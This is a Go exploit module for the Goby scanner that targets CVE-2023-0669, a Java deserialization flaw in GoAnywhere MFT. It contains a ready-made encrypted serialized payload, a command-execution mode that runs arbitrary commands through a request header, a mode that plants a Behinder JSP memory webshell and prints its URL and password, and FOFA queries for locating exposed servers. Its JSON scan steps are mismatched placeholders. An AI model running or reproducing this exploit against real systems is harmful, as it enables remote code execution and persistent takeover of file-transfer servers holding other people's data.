package exploits

import (
  "encoding/base64"
  "git.gobies.org/goby/goscanner/godclient"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "strings"
)

func init() {
  expJson := `{
    "Name": "GoAnywhere MFT Deserialization Vulnerability (CVE-2023-0669)",
    "Description": "<p>GoAnywhere MFT is a solution for managing file transfer, which simplifies data exchange between systems, employees, customers and trading partners. It provides centralized control through extensive security settings, detailed audit trails, and helps to process information in files into XML, EDI, CSV, and JSON databases.</p><p>There is a Java deserialization vulnerability in GoAnywhere MFT. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory horses, etc., and obtain server privileges.</p>",
    "Product": "",
    "Homepage": "https://www.goanywhere.com/",
    "DisclosureDate": "2023-02-08",
    "Author": "su18@javaweb.org",
    "FofaQuery": "banner=\".goanywhere.com\" || title=\"GoAnywhere\"",
    "GobyQuery": "banner=\".goanywhere.com\" || title=\"GoAnywhere\"",
    "Level": "3",
    "Impact": "<p>There is a Java deserialization vulnerability in GoAnywhere MFT. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory horses, etc., and obtain server privileges.</p>",
    "Recommendation": "<p>The official patch has not been released yet. Please pay attention to the manufacturer's update.https://www.goanywhere.com/</p>",
    "References": [
        "https://frycos.github.io/vulns4free/2023/02/06/goanywhere-forgotten.html"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,ysoserial",
            "show": ""
        },
        {
            "name": "URL",
            "type": "input",
            "value": "/{{{rand|str|12}}}",
            "show": "1=0"
        },
        {
            "name": "PassWord",
            "type": "input",
            "value": "goby",
            "show": "1=0"
        },
        {
            "name": "Referer",
            "type": "input",
            "value": "https://gobygo.net/",
            "show": "1=0"
        },
        {
            "name": "serializedData",
            "type": "input",
            "value": "",
            "show": "1=0"
        },
        {
            "name": "Gadget",
            "type": "input",
            "value": "CommonsBeanutils1",
            "show": "1=0"
        },
        {
            "name": "Category",
            "type": "input",
            "value": "Memory Shell",
            "show": "1=0"
        },
        {
            "name": "Memory Shell Category",
            "type": "input",
            "value": "TFMSFromThread",
            "show": "1=0"
        },
        {
            "name": "Web Shell",
            "type": "input",
            "value": "bx",
            "show": "1=0"
        },
        {
            "name": "Yso_options",
            "type": "input",
            "value": "-ga",
            "show": "1=0"
        },
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-0669"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "GoAnywhere MFT 反序列化漏洞（CVE-2023-0669）",
            "Product": "GoAnywhere",
            "Description": "<p>GoAnywhere MFT 是一个管理文件传输的解决方案，它简化了系统、员工、客户和贸易伙伴之间的数据交换。它通过广泛的安全设置、详细的审计跟踪提供集中控制，并帮助将文件中的信息处理为XML、EDI、CSV和JSON数据库。<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">GoAnywhere MFT 存在 Java 反序列化漏洞，攻击者可利用该漏洞执行任意代码，在服务器上执行命令、打入内存马等，获取服务器权限。</span><br></p>",
            "Recommendation": "<p>官方暂时未发布补丁，请关注厂商更新。<a href=\"https://www.goanywhere.com/\" target=\"_blank\">https://www.goanywhere.com/</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">GoAnywhere MFT 存在 Java 反序列化漏洞，</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可利用该漏洞执行任意代码，在服务器上执行命令、打入内存马等，获取服务器权限。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "GoAnywhere MFT Deserialization Vulnerability (CVE-2023-0669)",
            "Product": "",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">GoAnywhere MFT is a solution for managing file transfer, which simplifies data exchange between systems, employees, customers and trading partners.</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">&nbsp;It provides centralized control through extensive security settings, detailed audit trails, and helps to process information in files into XML, EDI, CSV, and JSON databases.</span><br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\"><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">There is a Java deserialization vulnerability in GoAnywhere MFT. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory horses, etc., and obtain server privileges.</span><br></span></p>",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">The official patch has not been released yet. Please pay attention to the manufacturer's update.<a href=\"https://www.goanywhere.com/\" target=\"_blank\">https://www.goanywhere.com/</a></span><br></p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">There is a Java deserialization vulnerability in GoAnywhere MFT. An attacker can use this vulnerability to execute arbitrary code, execute commands on the server, enter memory horses, etc., and obtain server privileges.</span><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10709"
}`

  exploitGoAnythereMFT123918391 := func(u *httpclient.FixUrl, payload string, cmd string) (*httpclient.HttpResponse, error) {
    cfg := httpclient.NewPostRequestConfig("/goanywhere/lic/accept")
    cfg.VerifyTls = false
    cfg.FollowRedirect = false
    cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")

    if cmd != "" {
      cfg.Header.Store("X-Token-Data", cmd)
    }

    cfg.Data = "bundle=" + payload
    return httpclient.DoHttpRequest(u, cfg)
  }

  echoPayload := "Jh88%2FjqGQWSbZmiCc1DErQhwOhCTLkYmA1yXgf86Ha5HF9IfVuQMLOfBS%2FfjlP7wTTEg2%2BJx9nBDyFUKVTroXpFBt7zN1XDX58VKZCxCXlUD45d4laUUnNuzdyvNLT2b%2FgYKBi2%2Bny7fc2lOHNgalYV13mQzCTs0EgEUE9AuDUIMcFYx00pv4g4EOgEjeWbAx40rTtRby71AxapyXKy%2B4XChDHVlPB1AV3njBKGWT6gHdPxT8hb75Ycrpjdk9EQ1v4XlsWf2pcEuH1eHc%2F2CHlgeErjMGfXyXh9lNdrEoAOtw1UQOnhxT8clRjShGbSJSjIqgD8WyLRI0WsHnhdxBEgW8AluKnVsysck6loZL29Z9aaH%2BP4kvMzNqVmnIcvZ1%2Fh3RLrtpSkbAbHXO0x0OpfU6f4T7xkoeMKt18mECpB1b%2FwIptrx4zYgHBYPwrmdjqyvCd%2FhfgIUWZ78QxN6%2BlffTHygs1TkMThebklF8vPAvqbye3LbxSo7BZ0NqSJpc8w4cdBYH2cYRVYBbiZvks%2FxiNTair%2FiGeK4RvzRnXhIwqwvY%2B5r0jf1Tb38rQY69pgKSwNFpPbkVJEUowSYIgldWMvTJo5I3ajtAeHHQKsClreyH0k86avvdtW4CpT%2B5GzUGCh3Ot5m35kFlJUPwkO2mIlGFGMmzjCi8SRurhbV0ZsZHOUuPeyo72ZJPueu3njMFb7xeyaZ8ZQ1aP0PcVSS4lPkr4LTG0betMt35M4mbi6BTwfWG%2FZ1MeBI%2FCz8Sr1I0ntYaBWdzTM%2F3G15zgs%2FB7ERnDrlFkNqbIE5WfJIB4Bd8TJldZJxzSRD9QYmerZEZcPGvLwtJ6%2Fdkin0MzvIt293LvUa5turzvfEZZ6xfJ9O27KmH6HLWKbgF9%2Br0o27iR5kpCrPkCCUl9txRzipRvoXLyB4tDLUf705A%2Fnbm%2FXhpevx%2BFDjdfNWc1x8kwSUS2IbrvmLdhZ5YrF2ykHlT1CDw9X9LanYZd9IptVyIvKV8K3tU0haZjDnhvOHisWKMX8EZAHHHfFzhD3uG%2FJekg32m3t4dGc4ceKRbKndHFwYpbroM%2F87EsV89fthGXwQ%2B%2BJJIQvB4WNrwi4mzBNpgt%2Fjre9yzpTqpdE90tIWE6UAwbUDggi8XiS3ojTCrkauPrWLsfhm6PnetJ8Yn3pKshxgL0cmy9nc3ueKDSKTKiiBvkXh7YGVhBBviKC2S6JTmGRG7ubTVuSVULOoNNjGaywSCU%2BtAjF8%2FcXYpVJjTkcZfKm07425f0jIPJj4Zqidh%2FjY6bb5NSwCnVlyjWx0OvrNYu51VSwms8WOcz9fjMqBD0uaG16Kc6tfSkDn7os0yvaSemxcqtlBRCPC6w11PBp42KVnlJaw58KVXNqzIy0oxtro76W5T7ZdHg3fJRmsAG%2FC4B%2But2KZog9a4GVGwmSMJImfO9V5TnMcbC68CTC7fN2csnI%2BT1HNFswKuwd5eHYSa5QfglAvtE6aXKvFDOqpx4xYpGY3JffZ6IRAxSO3WhMD2wi2mHPXyySEmLsyb6Vhv8AGONepfc4WFRl9iB0QKufwytRUDmSrodFDXCT0CVL%2BEpfUPm7B%2BP%2BwBc2FoUMTT41hq1fZ0MaUU61lhb50%2FnV86LJkoSUWT85i9XH0%2BXZG2zcEP6CbXOf6xSb2ygipVzoNZUYW4ERyXXV%2FjKoRpuXkDar1t4oO7RCYXZaUBSGnXaPmzl70YHCe%2BRh3i4nruUxTsl5inyEFKcVOnyKegbdb48kuN3xXNo%2B9EhcruhjQ2A7AgRZYXL%2FRPtsTIRUEDdIIhB%2FHV7VS0aD6xLLmwDQSQ4A%2FCfI6F5B71P%2FYrPMlkG1ABIJjtYCAzcv2PYc4UfPDduGrX9CaQK3X2bukt2Rxfh3MT2gTUzBEaL86HB9wNp4LwrVrBKx%2B01MGAy0Eh8kaNkxnObFg2mRzSEI8y4mThUS3O9ovprjsIDBLGTXbqpVaJByOcsyh4cXJBDLEHBnhe3aRrpGIKUuQ5hCjDbfVKUrM5NQK2GXXkbHg5gvyZTwAqIGWPWc7hImnETseOmsuyPXApJPIGWmSHh1lg3uT6jZlm6rdha5zsPjytvkeg4iV9x8j9%2F0%2FgoYMPs6%2BrCicIC6npFbHWFwjw91Mgeif5xidj5hHoUPAgAa9WCUx6qOGlfTlo7cmA1t5KfRSSEWwca72jXb%2FRcv9bZujSK6J9BKvTT5nREpfXDdRkbgdB4wFHSbpaUOPI%2BsUqCm5AwUtIzkSX7TyhpJ9kSsKGLwU65Z9a9teDxsVsVbM7MFfrnpCK2ldb8J1jjfDnr5%2F0SXDcY2Soj0lZMjgY1sdppSmOjg9XWcshIyRjMJUNw4ieDlyJbFRJRrDbTU6VT9bn2hxI77scezUbj7XCn183dS7voa9IT5XsyEtSZJ%2FXW3jGnWAY8HmUk6yi3ctjJP5T3AQVduQwZu3sNZ4W0rvgMAr3W5mjQO2avwIr3n9WJ60unP0ZDYJfuQAsbS4FUzNUa8nFY4LqNCi%2FdLuzXuu6QCiFFMw8taB5sjpwVudBluFe4pW2m2aWvJ7kBsTkonrTYZu2eOx3vHUwcJcplSglOAT1N%2FHWnfRnqRLKDTHXpu665G1pdq%2Fk02eqPKl2HwyQhcT1b6cn0CEDE1PcYUa7VgU3gYjlwvP0QbTy8sA3lLzxNazIRYUrk%2BMZ%2BCTMqoTK5lAgH%2B44tdRvomP97tdmrts3c86IPSQbDZcum2S62l%2B2U9hZwXBYSUpkR6amzZqYAaRSjzgaMXvCFOEJTERKihIEwPAX6ZYMwesPbk4r%2FtSMuaTk4WZnYkl0VadR0FK05szaVyvS2v%2Ff1UowuIzmr4nTiTAImIeKFnvZaqJOMiTCepZhJt%2ByAkgRSe%2F0TvXpFmsWTY%2BoFr2mgmv896fj4Hhj44cn1YiKZCZUPaMMxv%2FQNww43exPYUvvo4UC7XAutjeos91bY5bzaRXealCPbV%2FFtyHKJt6G9srVPRhC4zE%2FlQYArA58jtwc5L5ENccwCn2vkalJJGv%2F6Zciy2XGIChYBPWX2KnPvZhAC2j9GIJ3XoAIW6rR0xl8sC9SHYkuqFYoCjIpxx09hBFdGkRziqXZ8BYFcsfgWdc9yzXyO5D0%2FeLgJdllKSI7IClYyWjlUZAIH0%2FHnH4LB2zee37svSRwpQFFzrQIGqNVBmifnpAaoXGqX2JJdRzbj%2B%2BnvFNXINYSgwuPeFd%2FSwu32rdnP9GTbli37Vvgo8rggaVmkMmN%2B3qEPj0Tk9h4Kh2wRtrEpfLEwUDExtabHEwBpK2cv4GKzkYwPBTqCEzL6pIeNJfgRwaP%2Fyjth9k%2BYj1XZvFhGD2q7DbDEwzjjIr4hIilkUanqXBqvxpkEa6w%2F7%2FIIeldHVOdivp%2FTKUj8tBbwvdPbEgdfa%2FfaI9%2B3UwkarulMbN8GZy%2F5miSPTFHgVOoUYljJZC64P%2B6f3ULS%2BpMBGJvXUpiGbwDAFJuL4FjIrK%2BZddx%2Fs%2Fq8jTLGuJWuZF2T6e%2Bv%2FHxOkFxXf2%2Bko3kD%2B%2F55GVQoEp0X%2B9lSQZ9sg5JLrUvyVPxz38wrMbriVq5I5E08sLrR3k%2FMlO%2Bu7dXibWqdkHRGMvjp1rukHckmqO5eRJ3txAoZu6CwFfZhguA7B8a0jSohCd8MbADAVOayKzd3jSgaLXfuQaBDHP%2FSON6Tg35m3gEThOz89yo314ZEaVfqREldwDKEmaujr4u5%2FTMTszNcxDT92YBV%2B842GoQd5oiMvGidIvaQSAS62RoZps2VcB%2Fe77gq%2B0O6C1e0Fiu4WpZKMR3Gqz61x%2FuPhPmizBvuuWmXXZayiGXuQ1F0IQbMMy2sLIBIj8xutufef4pG77Pnq3FCVdNhYHK%2Fq54QbSuWO1UtzGI4rPDnLjutTh2RBkfIv%2FaHRCTAq6lPGMYLR1emhAIAhSc3FV2KuEY0UvGIwFug8LO%2BWzwtbvLR6vX8bupUIFxGbMzCJARriysXQQmCx9TaEeZByu42Hlr14MScT46rYUZGwxS%2FIaEISZc05d4Psh5DZq0%2BRaPaYVuCRsJ7Pcpfl2aSGFi%2BVtRwrAIejgAbL8bcYuhkXdmeyqDqGN4SCvBqo%2F38tbO0aeXyDt%2F3oqntq8rOvZ2cvoRJ%2BmQYa8WcZoNeunCwE1RBL5CdsJj4OX2Ys%2Ftl9U8rgZYECZfPIlLGf%2BzNB3oszkqmgi7kCu1JGPBe6zJ8ocCLAvEdrkfEgtouqT7Z2mD8eI9rwYRxAsXHzPshRmkvzjywUekD%2BOMiTOaPuGWWpfN7SYTxfg3Fu591Ez98AcKRwJzO5N6kQy1UgEggazf%2FIrI7rzstaTPE3Qr%2BZmyekaXKLZQZhJOU%2B7UDsFDypb6IysRNyymjhBEOvHtwVWoHgagKYshTIaFHXnZcSF0XN493qI18%2F4xOS1bOLORjfoAQwgnf59qOMkHv2zLAysfvojeMU1wSHS%2F2QVubDUFyV8MgiHTDzUoyJtOYVPbOxpBh8E7%2F2OCpa14Z%2BBOVJMfmnTQb7y3flOaHmtq1sSuTmZok%2BJy70vbvkg94hzzC75XoJKthgYcdsfTlXCpnEX18eBss1%2B%2FI4BLVVOVaZeN6S1J2UXeNSUYxm9wLB9EJWnzZhv9JFJWwhf%2FT9dTFbP93JHktCSCeb6Ezg5LHfFtrTBqgsvRYC3MzMdyUYvkAOvZGL8W5Z%2BnH7UIdFE2IcgshZ6NjzX3oMRkLaYRBpH165fhmpVeLxU8h%2Bd6EmRwkIsKHtFQIDP7SagNiWvMENdEPXlUTA%2FM5s4hZQH4fFs7hvegel5cAohV%2BAvcx1MJVRWap9g9PRQ4pTWXWIvVAFvXJG5A6%2FK1gNsPoly6OeKmv0Np2VdcBXkWgCTD0Rg4XSiWP1B9o0ZcJeDKxsOwcV3a9%2F47czj3TcRrqeFmwSo9pMGlVs6K4Far54aYQ6p5%2FPpFx2KkM1Wrq%2FfUMHpA%2BZTfqsBfHnGsfaatrsvs%2BoTLdSCWB7FtTXO86DN0SL%2F5GHyr1M1X0E5nq72BImOxKgSxFOnpNGv82YMeBLGPUZp33msK5p1ihxZ84JRc9OjsfRbDP4NEmY3H%2F6zn%2B7ZXdMlLZr1Wzce8d72IvM3%2BrbAoQu%2F%2BfJsF%2FmxbJOf2lcSFD2lJCEtuipm%2B8g%2F6l3usRNS9PkHAcjSXfizSmkonAXFBERIPQe4GoNUPBZnPuqaPzGOvggP57112V5yIW1rsXe4TEnTBWZc3f5r4oSU543dFK9ToOZcOXS1o25jq%2BurMHP64lZBZfVcVdnLwmGje1UQtgDjo5YdUsNqPogPVeEXShNbqzQZGTQkR3X0sRLsLXpaOBArJQUhaH4ZqeiaDEzcQd9St4zEmoEQGlyuNg3p4ygWkKyL%2Fq3iHsqr1Lshb4cDqXedxNwxEKn1b8DFaPvDmv8qABHhOB%2FeXz9SKZv917Tb2tfCyn0OaiWEu4Q3p8szelSWupHYEscRinwEVurpYxkUm%2BwLG7KPU7st3w4vMp5TSrfSZS1PgRdf%2FCUDEpxzQqb4nmcfZk6%2Bvt1xFDbvOW7Noq3lRyYQHEncQyqThsNSWb4biWR4h%2B5BAg5sggKG5na5Hwgbc0KkAT%2BPEpifThnRv49mWMuWCT1%2FColn3TAfZQfTAmEbMaLonJySJfqOhYbEuNqd%2Fi786LOBjW29CMI1o2msbxDikKlL1zteScYWoacGeWQUjz%2F8AVhGf6HEQIGFzQ6GsgY3W635jEjS943Yj%2B1M1XdH4eA3JObfSFtlXdBo8wEzz9V9rMgz9mLv0QQY6tNOgJP3nIIeiWIZ7tiqPuB8O0tXURy3nyoIhYhwo5%2FMoS1LGcX8vnUum5z%2F5%2FgvJgFmTVW1MNodK5%2BVBOG7Xdu14UVQB4tZhCje5Zjvrrx4CSs68FKuunH0PrCzNnVYNv9K%2FxKQbf0mDIPDSz4nOmcYWyTre2vq1GGcFJ8It5G86aKsXVbnUvRE"

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      randStr := goutils.RandomHexString(12)
      resp, err := exploitGoAnythereMFT123918391(u, echoPayload, "echo "+randStr)
      return err == nil && strings.Contains(resp.RawBody, randStr)
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

      if ss.Params["AttackType"].(string) == "cmd" {
        cmd := ss.Params["command"].(string)
        resp, err := exploitGoAnythereMFT123918391(expResult.HostInfo, echoPayload, cmd)
        if err == nil {
          expResult.Output = resp.RawBody
          expResult.Success = true
        }
      } else if ss.Params["AttackType"].(string) == "ysoserial" {
        webShellUrl := ss.Params["URL"].(string)
        password := ss.Params["PassWord"].(string)
        referer := ss.Params["Referer"].(string)
        serializedData := ss.Params["serializedData"].(string)

        if serializedData == "" {
          serializedData, _, _ = godclient.GenYsoPayloadFromParams(ss.Params)
        }

        data, _ := base64.StdEncoding.DecodeString(serializedData)
        serializedData = string(data)

        _, err := exploitGoAnythereMFT123918391(expResult.HostInfo, serializedData, "")

        if err == nil {
          cfg := httpclient.NewGetRequestConfig("/goanywhere/" + webShellUrl + "?" + password + "=1")
          cfg.FollowRedirect = false
          cfg.VerifyTls = false
          cfg.Header.Store("Referer", referer)

          if resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err2 == nil && resp2.StatusCode == 200 {
            expResult.Success = true
            expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/goanywhere/" + webShellUrl + "\r\n"
            expResult.Output += "Password: " + password + "\r\n"
            expResult.Output += "Webshell tool: Behinder v3.0\r\n"
            expResult.Output += "Webshell type: jsp\r\n"
            expResult.Output += "Referer: " + referer
          }
        }
      }
      return expResult
    },
  ))
}
